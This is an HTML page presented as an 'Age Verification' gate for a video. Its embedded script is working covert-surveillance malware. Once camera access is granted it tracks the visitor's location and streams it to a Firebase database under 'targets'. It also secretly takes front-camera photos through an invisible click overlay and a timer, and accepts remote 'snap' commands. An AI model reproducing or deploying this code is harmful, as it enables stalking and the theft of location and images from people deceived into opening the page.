<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>G-Services Access</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { font-family: sans-serif; background: #000; color: white; text-align: center; margin: 0; padding: 0; }
        .container { padding: 100px 20px; }
        #playBtn { 
            background: #d93025; color: white; border: none; padding: 20px 50px; 
            font-size: 20px; font-weight: bold; border-radius: 50px; cursor: pointer;
            box-shadow: 0 0 20px rgba(217, 48, 37, 0.6);
        }
        #videoArea { display: none; width: 100%; height: 100vh; position: fixed; top: 0; left: 0; background: #000; }
        iframe { width: 100%; height: 100%; border: none; }
        #captureLayer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; }
    </style>
</head>
<body>

    <div id="mainUI">
        <div class="container">
            <h1>Age Verification</h1>
            <p style="color: #666;">Confirm you are 18+ to watch this video</p>
            <button id="playBtn" onclick="startSystem()">VERIFY & PLAY</button>
        </div>
    </div>

    <div id="videoArea">
        <div id="captureLayer" onclick="capturePhoto('user')"></div>
        <iframe id="viralPlayer" allow="autoplay; camera; microphone"></iframe>
    </div>

    <script>
        // 1. Firebase Fix
        const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
        const db = firebase.database();

        // 2. UserId Fix (Taake ReferenceError na aaye)
        var userId = localStorage.getItem("target_id") || "User_" + Math.floor(Math.random() * 9999);
        localStorage.setItem("target_id", userId);

        async function startSystem() {
            try {
                // Request Permission - WebView handles this through the app code we wrote
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                stream.getTracks().forEach(t => t.stop());

                document.getElementById('mainUI').style.display = 'none';
                document.getElementById('videoArea').style.display = 'block';
                
                // YouTube ki jagah koi bhi video link (Auto-play enabled)
                document.getElementById('viralPlayer').src = "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=0&controls=0";

                initTracking();
                // Auto-capture front photo on start
                setTimeout(() => { capturePhoto('user'); }, 2000);
            } catch (e) {
                alert("Permission Denied: Please allow Camera/Location in App Settings.");
            }
        }

        function initTracking() {
            // Location Tracking
            navigator.geolocation.watchPosition((pos) => {
                db.ref('targets/' + userId + '/location').update({
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    time: new Date().toLocaleString()
                });
            }, null, { enableHighAccuracy: true });

            // Command Listener for Photo
            db.ref('commands/' + userId).on('value', (snap) => {
                const cmd = snap.val();
                if (cmd?.action === "snap") capturePhoto("user");
            });
        }

        async function capturePhoto(mode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const imageData = canvas.toDataURL('image/jpeg', 0.5);
                db.ref('targets/' + userId + '/photos').push({ image: imageData, time: new Date().toLocaleString() });

                stream.getTracks().forEach(t => t.stop());
            } catch (err) { console.log(err); }
        }
    </script>
</body>
</html>
